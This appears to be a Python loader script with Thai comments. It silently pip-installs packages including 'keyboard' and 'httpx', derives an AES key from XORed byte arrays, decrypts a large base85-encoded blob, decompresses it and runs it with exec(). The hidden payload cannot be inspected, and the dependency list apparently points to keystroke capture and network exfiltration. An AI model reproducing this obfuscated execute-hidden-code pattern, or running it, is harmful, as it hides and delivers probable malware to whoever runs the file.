
import sys, base64, zlib, subprocess

def _req_check(p, m=None):
    if m is None: m = p
    try:
        __import__(m)
    except ImportError:
        print(f"[*] Installing dependency: {p}...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", p, "--quiet"])

# ติดตั้งตัวถอดรหัสก่อน
_req_check("pycryptodome", "Crypto")

# ติดตั้ง Module ที่แสกนเจอจากโค้ดของคุณ
_needed = ['ctypes', 'keyboard', 'httpx', 'os', 'subprocess', 'datetime', 'asyncio', 'ujson', 'rich']
for mod in _needed:
    _req_check(mod)

from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

def _xor(p):
    from functools import reduce
    return reduce(lambda a,b: bytes(x^y for x,y in zip(a,b)), p)

_K = _xor([b'x\x87v\xd7\xdc\x0b\xf9\xe9\xf9\x15\xe4\xda\x03\xe4Ps2\xc6\xaa1\xbc\xc3B]\xcc\x9cR\xc0\x19`\x83\x9c', b'\xf1P\x89Z\x16\xb6Q*\xb5\x1b\xadN\x07F\xb2U\xf6\xa9UxF\xeet\x80mro\xa3^\xfa\xed(', b'r-\x98\xdf|\x0e)$M\x1a\xadBU\xa3x\xaa|a\xe4;&\xb5\xc1I\xd8\xd8\x90\x9c\xc4\xf6\xe7\xc4'])
_I = _xor([b'\xd7"wtV\xae\x9a\xd1\x0fo@k\xff\x1e(\xbe', b'm{rAc\xcb\xfd\xe1\x82)\x11s\xda5\x1d\x0c'])

def _decrypt_str(d):
    iv, p = d[:16], d[16:]
    return unpad(AES.new(_K, AES.MODE_CBC, iv).decrypt(p), 16).decode("utf-8", "ignore")

def _decrypt_bytes(d):
    iv, p = d[:16], d[16:]
    return unpad(AES.new(_K, AES.MODE_CBC, iv).decrypt(p), 16)

_enc = base64.b85decode('X!f~g`Ton`Q)E3em5(4KN*DWzjVuz*H;s4SvEHZ9y<uMpT(;(wwt1t|5}P2lH05I3?VO$fJ?^wJ049B0M=#$A4{5r@EJRh*uGJxjaEJoPukEZU<(@Bz(NN*tvR`kri{vNA&JaKKkmA4N7aqd$7i>ROYGJ4~j}D{7xmMMtCIbBZmMjIkPTG!PlCT6yXZ6b4U#|&tV5((;sOj+W(<@Z+%YfK3fC`qkq0#top@4b;mVSe?%nS7PV;*Z1ZPE1*n9N^>5N!6F^o@jz&G_vSy3jws*(20%J8ofgu#PdUU#K)Z^E@JMRm!LD>{K_R{IWu4$dz_&gSGQpJSu<)3rQ>KrsLu>K59l<uO%(=NDp5)km201Ww_GD%)bf2E&$E<I)6(uqXnloyCu86uGaM)Mq<-jfm$`~fxN60-j=^38mxbrKWfg(0BcH9Asd!5ff2DTqreA&d|x*eYVvfKCueWLGf_J)lzY=XJh&oefc|cKOT`L5VL<0|Ey<&4(cZ39Z4(DgnPe^vps%dDkZeM->PN5?Kr#G1VElp0w~<QEQC?~GgV|ZDMiO`h3iDG30+l&B!Mc5nAFkaSBf2-<*T5iK0nbGR&n`L0;!o&)jYkFwZGWIoOWJA%JCIhF%oPQt+^I0~OHEB7oXFum6Q7^~Wkqe7T?Aabv^F+5%&e6Fr`C#sVrX1{z|l@g;U4T^hOsCP(GaneOks#P^2=Z6jN)ik8{Eon(xP%{un<{ya;xV7Krb!$h#12>A|jWGAv1G=xo>-09Vp$@)MSRC^v4nFDSoVl;(zig2Mq<;hAL<D8wEQM#@$@=?>9=Wwgjuqvx8}ax3flsawo&iT+(vs3CTj9+~2{sc_|2GtsMKeE&U5n$4FN;&M-V)h$<F#py+Rm0SYupXBI+WXp=QYgxe8$BXvjxb1k>g`YmXMPLmH~CM+^SI_y^PC21u}Ip=xp%(Lot?y5b{>MKOc=k1NYHjU`He{u_q;`BA$c@qm+vP2OR!kr+pT<Bi^W<pHmwNp0N%o}RRx%USy%~UyktD#;iC%)uwII-ZF$GLxm4*$VexX#r;?Ocnl6{BP0S{%^YacQWcnMtaa;A6tG#3ZFx)T9OAN~PHgjgJhYY&_lXDbQyA30M=P5_30G&b*I<Ct6BGZ@r)wg^|Ki$S~!xQ@Otw`ltL(yAPA<qT)#!JcZVOa7}J;4R}pLDh2L6rimg^`g<&t(I7Em>;((AJj{`k&a792!KK7X{+`Yhd%hjc<9n1QfFMR$^N&d=dGx8E9T}ju??m)&`Ye1lf-wdt(Ap%znw&mx-*JIyPtBeqCPDqSrQ;5U&&6V`JprgOsvL8n%%^n_Xc9{&2jn3ra~w3!Wzbhtc`J7DzW>&3>Ri~6rDHXiw%k#Wl6v~0Va$imS}CZfOuxeIEsf_7{caZY@rrC^ApDCT%QCYcLv5`z)a26soH=t2)8p-~^JUK282S3_l2@cn6s|Bv;IW(6>OqdoptxTIMmwnP3l_`ak42+BUvr7NQ2)dbo*bX*)->vPMdYcIG(q!q3i>cf4Ctgw#L{*b+C%Cy20R^Jf_a6R;<H+K67ZYS&}88B=MJmQd(pT8Miv;b&V0d`^*HxyrgK4J|BP)7eN6p$CVfjkRa<~rD#)Fgwm$B%8Wq4Dpn1?g7G!rNg5t^`6{`iyNwyda`<}zsJOH;3sDz!mbtNkYv7n`10{XSmZZ%La3X28cu{MfAi&G1~s^Q-Qh}xvs-y1YwA+iH#*Q*RP*JW<UiFm%V)plWfGm|);7q|W1fbGUk7^Vq?{=Mu(96R6$7qRVfBFw1$Qo@#AGd#3KB#G`OIQPw_nSBbb?vSb_M0R*R4cl0CZpd8h6wOzsplCjJ1FtKKyX0a)ZYuHgJepJp(x>Y6R`Z7Xwx}b8l5FcnQqIb#V|G6icyqCf4H~4Q#;_@!S@`WIXo_~>FnmNWol6|M$7)+tJMv`<7b`!gu)M)caJp2Bipa~P2_$KP+?~RuGbs@YS?c;N4;Rvn^(3MVG3B+WM%TH$t@!qIE^Lx4Z2PU5jxR69++nprdbdH1vQym>GoPGC6~kEjOm9<_^+iGoIfwVMDgEvWjWAzHA4moq7eQGITY@YG*{A#8J+vVK@udrD8ct`guKZRQK;{^Gc}Kj#C-A8>{j^JX=0y4`h_^6oF#E@+p9)>`!iN)w*5t(EN8%O-_5T!F#uaH0%yz{i-(!0D<mt>y;3;hs`aa)GsA>^Ku36Pk8&`LdSR;5$jQqD(RgZqzEtAfe$iJXut~kqzK*jTdd2{hZiVni7YIGC{Gm~+zb)GN5q4NuVpj0?Mg!lp{m=*~*wST{%w@f(h+=O(xS*9Nm#gem+ApYH$r{(xG6+@?}mL7S_<liQ=UWPzsu<-442iMC}*!o6pxsEb+$-oLIvBc>`DGVj5WdF<nMD{h3TthMw_dqk^-*>63r~pZjElEzV%C1L5n9Nm!les_hg4ikkAtu9bM#|`EiA4_Ojz#<!j0W5>0Ujxna-JYp1}LjUU@m$&tfTA60I94GS_utzWH7ug*jWZ2>q)uE`zGUQ?_F^Dh;%Z7{Vw-Df3VE)rlrwzi-V9=xbt-e&#N&eouOT=TDeV@R|ffdj5i$}5o_OEKJ%Z|Jn#QnAP;>*A^?I97@|+OGOYwzsY%&Peyr8oV@$d|*n++GB7WbloEgL-HmMDQkle0_uqga|$tHL=S0KfoHP^M|`Wy27{YgwX%$sC@!^5e656WKIi~sr81s(eGUMQuBtCoW*JrwNjHihG6Z!~&FdVABa&1W(ROgX`MQK?XjZq1CX?R|mxQs}W*Z&SU@+q2tdM2Pk|G}8%j*`1nPl1Bo-UGZu!hF5ia_bSB0j;Nfhty!LS#>d;Zm2IGvqCw+v{i>#lzO;4gfT<F~uPonlr@>?=X#gc8MCKp!ap0>P$VUM2UafJ=0JH&z6%Foi=6?0C@1Y#&K2V6uBJo-Y@Z^$Qt`!ThJzg2~PLuoTk0Li)f?B!>((IyOchx=Vfg?f~_VTxGxbt+C%G@IAEYV}?)agrL%HRJXKa^V6LLA_I184XkWB1mxt-dtzfp4=y8ta-MjF{SvQ7|Erzvpq=PQg3oho%?0LYT?5CvW5uizDPacapsA1Nk-Tf?}L7=J%B&SBEO0N5g{Fm#nqk2y{C-L~4yx3-2$JwWRY>Rg2az;H9{zhkaffE|^tMUlH}jPU!6o_T!w2-YqO;Jko6qlROx*!@y~7!A|S0tHZUG#>2w!tP)R8eaWqq+X!)5%OGX(G|8lP+if}AUB{VBP^RDnk$fDlJqJ3%ed%5%P60PEU>2I9#Eg8k)&{#&G;=j%8K4DTI?%ESdW$Ajp?H@5x=@<e@PX0-hNT4u$6HUrViV}wjGhW--uXI_b6-qBqG#BA$RZUd-%CBY)dT_Swr<5`M8J3@7i0<vtgVIxiHkx;42S}|<8rUi!ScUBKa|7d+9jOW{PIoPRuq88HoC}*3`=Nw^s|uUlq5;YZ%xZqmGF1akEGO)x0Fv#K(H_XUmN#;x=6UCC{8-&5mwY@H;Tr;>%MfId{g)5Zu4!Zo*WZM$(uXf$JC1uTH-<Kx3qP6XP*k(lk3p>L|4q5pYAFV-;!1Nt`v4^H2|{hGRr2(ii!Cbe}o`{8;G~Qp~t-SapIN*rtcC0Xtt`;xH53;`(LV%?UkI6FID=!$zt-Si-#%y`bQ8!GHFBMCC0Edp|d_>`wiss=z+~_(;FC!Gr;WVA+nPzH(_7Q!9c<H1F`7^iC9?*G-}3URtT-?)@~J`q~nVzWEIm{d`ghB&p<nx>rl()n?xFcK<p{V@J)-kb?gJtdB0h079CmHOxJt_+d0Cf4tiJagpv=7SdPOlxlra!aCxLdz8m<gIOqVH6-@r$3E+{&Od~F|87LsT8LLe1Yk%EJa|V@vQcCOVc|Hl)I;y%Daz@<#vaf-<vrIp%jqn-Yh3<BdZYh!Ah7rLfp>9kdf%n76u~~Ly+O_W&)qG}yiE8}iqtNBmDd@?t#OLbS5@t2V<hi=e(zx&<OSy`0CP*^4ZUN5xh5^E<yt%QJY+n2ZK>QbLA@d5@$_MdYrGqR}qqo_f(Uaon;S;h?1=HkE--5iLRdxQT@EH}&dY`6Z^al#reyXWv&TL(S33xNkNrKZm5j#O);F&M=<c%ppJjcp`tdmJVcdlPB_9w1kNM+>(#DI$4D+h2XTa;mStp)=pvRZBF<M2LCOSw)}N^#&+E+AYotu^SMkrc$&<sbCdG&vQGRgB;JnxP#<%$Y;`$Of73IErGzh5Kxd+_)#<t!kj~!1%u<Tr!<&1Zr^YoHpAYNBdl=f|nD)MT<!4itz{-;8kZA#O;I@HYpgM6FG@SZCN%-lHpQx_@BdiiA6FMh7z(Mx%3u8JWp3g<@u2H5SP9420V*0ZDOh@^i4!VGr3NrM4jheAGorm{KvFOK@w7_jA2nR?_J1Y_>?_h+BxXJi~Q0C++p1BN{4MTTz;s%V*c+=2A?D=ZC5aPLk7-rz8vjj@SsdDtc)7g>d>u^KdrEW$It!Iubp_)?d%UVD~F(r0ikF@%FQ>4(o?$&m91Tr)h+@r73I#-BGaCfOh;ls{Q`zYbWyczAWRuKWKx0+iU_?1rsrLVo<Sp#y05<lkU<;ml=qN=any-JWM_^UkfR;bgLY-MtrY;6D=ov16YZE|&4#Ra+EQ?%6b^pe5i0;wFm6LT>o~?QD3A-`_ywfJ4S3(anvKl-(Tys^g{7wR_K@iQCc9Iy^Iz;$`^doMy`IUTgd8vV5yIy$&;&v|6M7_T6C$vX#%eeZv;R+)aja}v9huJ<?<IOwv-Q!V0wqm>7=xZ7@6NC45c$n2zzABqvLWACg@#)Kiq)gYrYW$PGXbY1bB;YJ3cDAPCSE#DZZtDtXr&=AaTb3BMbGQtUx44e>|T-_fuluiti*19!~{-Ez*5b=dGI9j_j)mfpx2`;1ykSurvxxtZ<_(hFF3$9f-4MyE6H*{Px6)t$Uz|zBt(1B^67nS>Bk<0JB3u$a%aYL@_e2`iDk5#PD!Y81t51BiHUjWsn@A`f=hm(D5(#s0Zu(94Ag9nxbiB;W0t!V<g{^a^)Oe<+j*URrK1Ta>@F7gW`t~NK5%I|MpSp~F)r}f;h7u1FH;_hV*brj&7&rtb~_R1_b8_uzh}zIcc&y6MO26UfKaIbWCyyciP|lm(r75myV|dUicR;hZnvl7lrayE3hX44r~WZEM)K?5Q;T|<GdQO@_iQp!s`%1GN}Z&@z32L)(Vu35V=Mm?(K-V<z_(BLS)p@eD2EqH;eMA!?#N2P^uGyl5%96K*yo6=9iYoJ!-z1ww;i_u_1xMH)M9$!$CR}MOs#t4bwqaZ7BEi_)D<YsW?4Gqesy-U+y%YgAuPr_x6*fJAHd4z%usuwF1dIHLoKmX{Mge1lwHYVl$KDfjkkRSv>r<yEOr7aGPx&aX1t`7#l^iDWD=<Hx3?(J7J9|AdAN_JdbvsKzIMZ3z3UBqT@1kV#2U}42_5tJ2a9S4$!*BizS|@7B|(2z9U&eLtc0cJZ4bU0Y5`ZF?0t}3<KaDoEe`*KbaQj7?LyBAw>$^*<|V9FC0qM(x)l~Pn>67lL@;5Z{Dy|0>944Ksabp3NP8(q@dEwk*u~gsiPzvb9Y!0Xo70~u2X~5{KS`B_`1xOEtEcHJ7XMf9-=hloSgnqUh|f&c*US4nck#UV^o}d-%-0s?y4f@r^Os||#n1f=nA8ZXh<Bz@U}PLko$q)`rLqA!B6HD3Q1Cmnn^jk;G%;?<9A)hTV~G5~*W5O?$KEVbvYeANu{8PCzTO9*_Wjx$gQdPmS|)i>M*dQPxKGLlnqGY`DaHMwy#H<E#BDQJFlgQyyS#=6C9M51vU~iMho)-tVz%^4C00y78X*ypufvF?w#gI{ZM+5T+=UHk-8WF8k?Ly>BC_?pM9Zf|yHj20hkSJ6Y-_I<dqYm2#%njkQuml{)Ch&_pXBU}pbD(ftI&C^i<(?R@wd=GwOi^}<eOu)yTa=5)}Si70$o7$=@!L;P2@IEUuPh0Cw74)ch0~+@*sD=INZR>gR&_3H-=zyisPJ+>s+j+_%$Q1U&Q~Vq9q~~GxdVte*Gf1D9b#u3zyqp&R=4yH=4-;0kz^&?bQ=%zzIQ>BRtZ8mx_8Bns}X!BVbxViQ>bUTvkE<)_#iY6bg{7K=5dCyl~kZaKiUomm}`(5F)HpA5CBaG^bYUv%p;U&#oI`$WHqe@lIui$&ui-9b4(jLS!@nw~l6^D$>tiM#o}xhj%nhb{p%KBxip?ud!8r^_mC?bLhcCS4;Rzw*zsu^Rq9;TllTD{q(lNmR2YzB^25&9K=B{#8LzF(fm8BIZ?eoDQ=GYmYj2@84Zr42hwinK-`L#`#7WacUN|sLFTviKVUSgW*d*lz!Ji&44GR2k1jhc5)$8WfmFAaK4oEBR)$?XK}Etpw%m}N1P;m?;BEf!pNt(b=zd9rF_@Shw^bc4M(rOtEEr+6YKXLRgIrbDfJLr?h6W^Yf5P9$hKez&!XIFEt3d%mPAw;U)*wvd0d!%g@$4EewI0|f)LkQir4W7eI0lk;Wi(feCe5b=x``XOBoWZ_`VS+X1d5t$5Sz;2nI>D!xpM)Xr>360ZrPLG>iAZDcL{_bgtM5ii7tytbapS*iHv+RUGxx8xW}??(V=C2zqFSzL2*ao<S57r&|rRTiYu5?*R~ZT-ixa(mk*t9c{)4Iv7|-dH3rJ)7#x$O*6*b6sp5byX$K4I1qn@E0yUVt_<WG@&0LW2FNa8Yr}1TW2HYR}Qqbg&2$7cOZUHMwVtna0iZXP?^Ht9Yc5exUH%^r*;G-RJ*b&qa%Q=%70QFWqsBgBM0QMHgHN+}10C$JiF9Nu71!pgD(u%Z0UUk*n6CWX_hG8CY65X=lTb#^=)e46;u$HKsf?39?Gbv!eE+qKe)$(8l*hqx;t8_)&7<$sF_Tl2BTmvrs6m#BiBf`AN2AJqUKz1^60M_i<')
_raw = unpad(AES.new(_K, AES.MODE_CBC, _I).decrypt(_enc), 16)

# EXECUTE UNIVERSAL CODE
exec(zlib.decompress(_raw).decode('utf-8'), {
    "__name__": "__main__",
    "__builtins__": __builtins__,
    "_decrypt_str": _decrypt_str,
    "_decrypt_bytes": _decrypt_bytes,
})
